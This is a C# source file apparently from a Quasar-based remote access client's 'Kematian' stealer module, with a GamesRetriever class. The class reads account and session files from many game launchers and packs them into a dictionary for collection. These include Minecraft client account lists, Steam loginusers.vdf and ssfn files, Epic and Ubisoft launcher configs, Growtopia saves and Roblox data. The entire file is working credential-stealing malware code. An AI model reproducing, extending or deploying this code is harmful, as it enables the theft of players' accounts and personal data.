using System;
using System.Collections.Generic;
using System.IO;
using System.Diagnostics;

namespace Quasar.Client.Kematian.Games
{
    public class GamesRetriever
    {
        private static readonly bool CaptureGames = true;

        public static Dictionary<string, byte[]> GetGameFiles()
        {
            Dictionary<string, byte[]> gameFiles = new Dictionary<string, byte[]>();

            if (!CaptureGames) return gameFiles;

            try
            {
                GetMinecraftFiles(gameFiles);
                GetGrowtopiaFiles(gameFiles);
                GetEpicFiles(gameFiles);
                GetSteamFiles(gameFiles);
                GetUplayFiles(gameFiles);
                GetRobloxFiles(gameFiles);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error in GetGameFiles: {ex.Message}");
            }

            return gameFiles;
        }

        private static void GetMinecraftFiles(Dictionary<string, byte[]> files)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var minecraftPaths = new Dictionary<string, string>
            {
                {"Intent", Path.Combine(userProfile, "intentlauncher", "launcherconfig")},
                {"Lunar", Path.Combine(userProfile, ".lunarclient", "settings", "game", "accounts.json")},
                {"TLauncher", Path.Combine(roaming, ".minecraft", "TlauncherProfiles.json")},
                {"Feather", Path.Combine(roaming, ".feather", "accounts.json")},
                {"Meteor", Path.Combine(roaming, ".minecraft", "meteor-client", "accounts.nbt")},
                {"Impact", Path.Combine(roaming, ".minecraft", "Impact", "alts.json")},
                {"Novoline", Path.Combine(roaming, ".minecraft", "Novoline", "alts.novo")},
                {"CheatBreakers", Path.Combine(roaming, ".minecraft", "cheatbreaker_accounts.json")},
                {"Microsoft Store", Path.Combine(roaming, ".minecraft", "launcher_accounts_microsoft_store.json")},
                {"Rise", Path.Combine(roaming, ".minecraft", "Rise", "alts.txt")},
                {"Rise (Intent)", Path.Combine(userProfile, "intentlauncher", "Rise", "alts.txt")},
                {"Paladium", Path.Combine(roaming, "paladium-group", "accounts.json")},
                {"PolyMC", Path.Combine(roaming, "PolyMC", "accounts.json")},
                {"Badlion", Path.Combine(roaming, "Badlion Client", "accounts.json")}
            };

            foreach (var pair in minecraftPaths)
            {
                if (File.Exists(pair.Value))
                {
                    try
                    {
                        byte[] fileContent = File.ReadAllBytes(pair.Value);
                        string fileName = Path.GetFileName(pair.Value);
                        files[$"Games\\Minecraft\\{pair.Key}\\{fileName}"] = fileContent;
                    }
                    catch (Exception) { }
                }
            }
        }

        private static void GetGrowtopiaFiles(Dictionary<string, byte[]> files)
        {
            string[] growtopiaDirs = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Growtopia", SearchOption.AllDirectories);
            int profileCount = 0;
            bool multiple = growtopiaDirs.Length > 1;

            foreach (string path in growtopiaDirs)
            {
                string targetFile = Path.Combine(path, "save.dat");
                if (File.Exists(targetFile))
                {
                    try
                    {
                        byte[] fileContent = File.ReadAllBytes(targetFile);
                        profileCount++;
                        string profilePath = multiple ? $"Games\\Growtopia\\Profile_{profileCount}" : "Games\\Growtopia";
                        files[$"{profilePath}\\save.dat"] = fileContent;
                    }
                    catch (Exception) { }
                }
            }

            if (multiple && profileCount > 0)
            {
                byte[] infoBytes = System.Text.Encoding.UTF8.GetBytes("Multiple Growtopia installations are found, so the files for each of them are put in different Profiles");
                files["Games\\Growtopia\\Info.txt"] = infoBytes;
            }
        }

        private static void GetEpicFiles(Dictionary<string, byte[]> files)
        {
            string epicPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "EpicGamesLauncher", "Saved", "Config", "Windows");

            if (Directory.Exists(epicPath))
            {
                string loginFile = Path.Combine(epicPath, "GameUserSettings.ini");
                if (File.Exists(loginFile))
                {
                    try
                    {
                        foreach (string file in Directory.GetFiles(epicPath))
                        {
                            byte[] fileContent = File.ReadAllBytes(file);
                            string fileName = Path.GetFileName(file);
                            files[$"Games\\Epic\\{fileName}"] = fileContent;
                        }
                    }
                    catch (Exception) { }
                }
            }
        }

        private static void GetSteamFiles(Dictionary<string, byte[]> files)
        {
            List<string> steamPaths = new List<string> { "C:\\Program Files (x86)\\Steam" };
            int profileCount = 0;
            bool multiple = steamPaths.Count > 1;

            foreach (string steamPath in steamPaths)
            {
                string configPath = Path.Combine(steamPath, "config");
                if (Directory.Exists(configPath))
                {
                    string loginFile = Path.Combine(configPath, "loginusers.vdf");
                    if (File.Exists(loginFile))
                    {
                        try
                        {
                            profileCount++;
                            string profilePath = multiple ? $"Games\\Steam\\Profile_{profileCount}" : "Games\\Steam";

                            foreach (string file in Directory.GetFiles(configPath))
                            {
                                byte[] fileContent = File.ReadAllBytes(file);
                                string fileName = Path.GetFileName(file);
                                files[$"{profilePath}\\config\\{fileName}"] = fileContent;
                            }

                            foreach (string item in Directory.GetFiles(steamPath))
                            {
                                if (Path.GetFileName(item).StartsWith("ssfn"))
                                {
                                    byte[] fileContent = File.ReadAllBytes(item);
                                    string fileName = Path.GetFileName(item);
                                    files[$"{profilePath}\\{fileName}"] = fileContent;
                                }
                            }
                        }
                        catch (Exception) { }
                    }
                }
            }

            if (multiple && profileCount > 0)
            {
                byte[] infoBytes = System.Text.Encoding.UTF8.GetBytes("Multiple Steam installations are found, so the files for each of them are put in different Profiles");
                files["Games\\Steam\\Info.txt"] = infoBytes;
            }
        }

        private static void GetUplayFiles(Dictionary<string, byte[]> files)
        {
            string uplayPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Ubisoft Game Launcher");

            if (Directory.Exists(uplayPath))
            {
                foreach (string file in Directory.GetFiles(uplayPath))
                {
                    try
                    {
                        byte[] fileContent = File.ReadAllBytes(file);
                        string fileName = Path.GetFileName(file);
                        files[$"Games\\Uplay\\{fileName}"] = fileContent;
                    }
                    catch (Exception) { }
                }
            }
        }

        private static void GetRobloxFiles(Dictionary<string, byte[]> files)
        {
            string robloxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Roblox");

            if (Directory.Exists(robloxPath))
            {
                foreach (string file in Directory.GetFiles(robloxPath, "*.dat", SearchOption.AllDirectories))
                {
                    try
                    {
                        byte[] fileContent = File.ReadAllBytes(file);
                        string fileName = Path.GetFileName(file);
                        files[$"Games\\Roblox\\{fileName}"] = fileContent;
                    }
                    catch (Exception) { }
                }
            }
        }
    }
}